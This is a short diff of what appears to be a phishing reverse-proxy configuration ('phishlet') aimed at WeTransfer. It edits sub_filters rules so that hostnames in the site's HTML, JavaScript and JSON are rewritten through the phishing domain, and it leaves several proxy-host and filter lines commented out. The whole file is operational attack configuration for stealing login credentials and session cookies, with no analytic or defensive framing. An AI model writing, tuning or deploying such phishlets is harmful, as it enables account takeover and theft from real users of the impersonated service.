@@ -9,8 +9,8 @@ proxy_hosts:
   #- {phish_sub: 'auth-session-caching', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   #- {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   #- {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   #- {triggers_on: 'www.wetransfer.com', orig_sub: 'snowplow', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
